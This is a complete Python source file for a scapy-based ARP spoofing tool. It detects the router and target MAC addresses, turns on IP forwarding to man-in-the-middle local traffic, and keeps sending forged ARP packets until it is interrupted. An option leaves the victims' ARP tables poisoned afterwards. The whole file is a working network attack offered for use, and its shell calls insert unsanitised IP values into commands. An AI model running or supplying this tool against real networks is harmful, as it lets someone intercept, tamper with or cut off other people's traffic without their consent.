#!/usr/bin/env python
#
# arpspoof.py - simple effective scapy ARP spoofer
#  thed4rkcat@yandex.com
#
## This program is free software: you can redistribute it and/or modify
## it under the terms of the GNU General Public License as published by
## the Free Software Foundation, either version 2 of the License, or
## (at your option) any later version.
#
## This program is distributed in the hope that it will be useful,
## but WITHOUT ANY WARRANTY; without even the implied warranty of
## MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
## GNU General Public License at (http://www.gnu.org/licenses/) for
## more details.

from netifaces import gateways, AF_INET, AF_LINK, ifaddresses
from scapy.all import *
from time import sleep
from os import popen
from re import match
from argparse import ArgumentParser

def fvalidip(ip):
	if match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$",ip):
		return ip
	else:
		return False

def fvalidmac(mac):
	if match("[0-9a-f]{2}([-:])[0-9a-f]{2}(\\1[0-9a-f]{2}){4}$", mac.lower()):
		return mac
	else:
		return False

def fgetmac(ip):
	popen('ping %s -c 1' % ip).read()
	mac = popen("arp -a | grep '(%s)' | cut -d 't' -f 2 | cut -d ' ' -f 2" %(ip)).read().strip()
	return fvalidmac(mac)

def fownmac():
	def_gw_device = gateways()['default'][AF_INET][1]
	mac = ifaddresses(def_gw_device)[AF_LINK][0]['addr']
	return fvalidmac(mac)

def ffix():
	for target in targetlist:
		targetip = target[0]
		targetmac = target[1]
		resettarget=ARP(op=1,psrc=routerip,pdst=targetip,hwdst=targetmac, hwsrc=routermac)
		resetrouter=ARP(op=2,psrc=targetip,pdst=routerip,hwdst=routermac, hwsrc=targetmac)
		send(resetrouter, count=4, verbose=False)
		send(resettarget, count=4, verbose=False)
		print ' [*] Fixed ARP tables for %s' % targetip
	if not args.mac:
		popen("echo 0 > /proc/sys/net/ipv4/ip_forward").read()

parser = ArgumentParser(prog='arpspoof', usage='./arpspoof.py [options]')
parser.add_argument('-t', "--targets", type=str, help='Target IP extensions eg. 13,215,23')
parser.add_argument('-m', "--mac", type=str, help='Spoof to user defined MAC.')
parser.add_argument('-r', "--replies", action="store_true", help='Use ARP replies instead of requests.')
parser.add_argument('-n', "--norouter", action="store_true", help='Only poison the target, not the router.')
parser.add_argument('-f', "--nofix", action="store_true", help="Don't fix ARP tables after poison.")
args = parser.parse_args()
ismitm = ''

routerip = gateways()['default'].values()[0][0]
if fvalidip(routerip):
	network = '.'.join(routerip.split('.')[:3])
else:
	print " [X] Error detecting the router IP, got: %s" % routerip
	exit()

try:
	targets = args.targets.split(',')
except:
	parser.print_help()
	exit()

routermac = fgetmac(routerip)
if routermac:
	print " [*] Detected router: %s (%s)" % (routerip, routermac)
else:
	print " [X] Error detecting the router MAC, got: %s" % routermac
	exit()
	
ownmac = fownmac()
if not ownmac:
	print " [X] Error detecting our own MAC, got: %s" % ownmac
	exit()

if args.mac:
	spoofmac = args.mac
	if not fvalidmac(spoofmac):
		print " [X] Your user defined spoof MAC is not valid, got: %s" % spoofmac
		exit()
else:
	spoofmac = ownmac
	popen("echo 1 > /proc/sys/net/ipv4/ip_forward").read()
	ismitm = ' (MiTM)'

targetlist = []
for target in targets:
	targetip = '%s.%s' % (network, target)
	targetmac = fgetmac(targetip)
	if targetmac:
		print " [*] Detected target: %s (%s)" % (targetip, targetmac)
		targetlist.append([targetip, targetmac])
	else:
		print ' [X] Error: No MAC for %s found, skipping' % (targetip)

if args.replies:
	targetop = 2
	print " [*] Using ARP replies."
else:
	targetop = 1
	print " [*] Using ARP requests."

print " [*] Spoofing to: %s%s" % (spoofmac, ismitm)
print " [*] Attacking."

try:
	while True:
		for target in targetlist:
			targetip = target[0]
			targetmac = target[1]
			poisontarget=ARP(op=targetop,psrc=routerip,pdst=targetip,hwdst=targetmac, hwsrc=spoofmac)
			poisonrouter=ARP(op=2,psrc=targetip,pdst=routerip,hwdst=routermac, hwsrc=spoofmac)
			if args.norouter:
				send(poisontarget, verbose=False)
			else:
				send(poisonrouter, verbose=False)
				send(poisontarget, verbose=False)

		sleep(1.5)

except:
	print
	if args.nofix:
		print ' [*] Leaving ARP tables poisoned..'
	else:
		print ' [*] Fixing ARP tables..'
		ffix()
